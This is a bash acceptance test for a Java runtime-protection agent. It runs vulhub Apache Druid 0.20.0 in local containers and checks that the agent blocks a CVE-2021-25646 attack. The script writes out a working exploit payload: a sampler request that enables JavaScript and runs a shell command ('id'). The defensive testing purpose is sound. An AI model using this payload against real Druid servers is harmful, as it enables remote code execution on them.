#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

image="${OHMYRASP_VULHUB_DRUID_IMAGE:-vulhub/apache-druid:0.20.0}"
baseline_name="${OHMYRASP_VULHUB_DRUID_BASELINE_NAME:-ohmyrasp-vulhub-druid-25646-baseline}"
protected_name="${OHMYRASP_VULHUB_DRUID_PROTECTED_NAME:-ohmyrasp-vulhub-druid-25646-protected}"
baseline_port="${OHMYRASP_VULHUB_DRUID_BASELINE_PORT:-18888}"
protected_port="${OHMYRASP_VULHUB_DRUID_PROTECTED_PORT:-18889}"
baseline_dir="logs/vulhub-druid-2021-25646-java8-baseline"
protected_dir="logs/vulhub-druid-2021-25646-java8-protected"
protected_log="${protected_dir}/events.jsonl"

copy_artifacts() {
  local name="$1"
  local dir="$2"
  docker logs "$name" > "${dir}/container.log" 2>&1 || true
  rm -rf "${dir}/sv"
  docker cp "$name:/opt/druid/var/sv" "${dir}/sv" >/dev/null 2>&1 || true
}

cleanup() {
  copy_artifacts "$baseline_name" "$baseline_dir"
  copy_artifacts "$protected_name" "$protected_dir"
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

write_payload() {
  local output="$1"
  cat > "$output" <<'JSON'
{
  "type": "index",
  "spec": {
    "ioConfig": {
      "type": "index",
      "firehose": {
        "type": "local",
        "baseDir": "/etc",
        "filter": "passwd"
      }
    },
    "dataSchema": {
      "dataSource": "test",
      "parser": {
        "parseSpec": {
          "format": "javascript",
          "timestampSpec": {},
          "dimensionsSpec": {},
          "function": "function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec([\"sh\",\"-c\",\"id\"]).getInputStream()).useDelimiter(\"\\\\A\").next();return {timestamp:123123,test: a}}",
          "": {
            "enabled": "true"
          }
        }
      }
    }
  },
  "samplerConfig": {
    "numRows": 10
  }
}
JSON
}

send_sampler() {
  local port="$1"
  local payload="$2"
  local output="$3"
  local status
  : > "$output"
  status="$(
    curl --max-time 15 -sS -o "$output" -w "%{http_code}" \
      -H 'Content-Type: application/json' \
      --data-binary "@${payload}" \
      "http://127.0.0.1:${port}/druid/indexer/v1/sampler" 2>/dev/null || true
  )"
  if [[ -z "$status" ]]; then
    status="000"
  fi
  printf '%s' "$status"
}

wait_for_protected_startup() {
  for _ in $(seq 1 180); do
    if grep -q '"event":"ohmyrasp-java8-agent-start"' "$protected_log" \
      && grep -q '"script_hook":"installed"' "$protected_log"; then
      return
    fi
    sleep 1
  done
  cat "$protected_log" >&2 || true
  echo "missing Java 8 startup/script marker in protected Druid container" >&2
  exit 1
}

expect_protected_startup_without_detection() {
  wait_for_protected_startup
  if grep -q '"event":"ohmyrasp-detection"' "$protected_log"; then
    cat "$protected_log" >&2
    echo "protected Druid container produced a detection before exploit traffic" >&2
    exit 1
  fi
}

run_baseline_sampler() {
  local payload="${baseline_dir}/sampler-payload.json"
  local status
  local response
  write_payload "$payload"
  for attempt in $(seq 1 60); do
    response="${baseline_dir}/sampler-${attempt}.response"
    status="$(send_sampler "$baseline_port" "$payload" "$response")"
    printf 'attempt=%s status=%s\n' "$attempt" "$status" >> "${baseline_dir}/attempts.log"
    if grep -q 'uid=0(root)' "$response"; then
      cp "$response" "${baseline_dir}/sampler-success.response"
      return
    fi
    sleep 3
  done
  cat "${baseline_dir}"/sampler-*.response >&2 || true
  echo "baseline Druid sampler did not execute id" >&2
  exit 1
}

run_protected_sampler() {
  local payload="${protected_dir}/sampler-payload.json"
  local status
  local response
  write_payload "$payload"
  for attempt in $(seq 1 60); do
    response="${protected_dir}/sampler-${attempt}.response"
    status="$(send_sampler "$protected_port" "$payload" "$response")"
    printf 'attempt=%s status=%s\n' "$attempt" "$status" >> "${protected_dir}/attempts.log"
    if grep -q 'uid=0(root)' "$response"; then
      cat "$response" >&2
      echo "protected Druid returned command output despite Java8 RASP" >&2
      exit 1
    fi
    if grep -q '"hook":"ScriptEngine.eval".*"algorithm":"java8_script_engine_runtime_execution".*"action":"block"' \
      "$protected_log"; then
      cp "$response" "${protected_dir}/sampler-blocked.response"
      return
    fi
    sleep 3
  done
  cat "$protected_log" >&2 || true
  cat "${protected_dir}"/sampler-*.response >&2 || true
  echo "missing java8_script_engine_runtime_execution block event for Druid CVE-2021-25646" >&2
  exit 1
}

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
chmod 755 "$baseline_dir" "$protected_dir"
: > "$protected_log"
chmod 666 "$protected_log"
docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

docker run -d --name "$baseline_name" \
  -p "${baseline_port}:8888" \
  "$image" >/dev/null

run_baseline_sampler
copy_artifacts "$baseline_name" "$baseline_dir"
docker rm -f "$baseline_name" >/dev/null 2>&1 || true

docker run -d --name "$protected_name" \
  -p "${protected_port}:8888" \
  -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
  -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
  -e "JAVA_TOOL_OPTIONS=-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
  "$image" >/dev/null

expect_protected_startup_without_detection
run_protected_sampler
copy_artifacts "$protected_name" "$protected_dir"
docker rm -f "$protected_name" >/dev/null 2>&1 || true

echo "vulhub Druid CVE-2021-25646 Java8 acceptance passed"
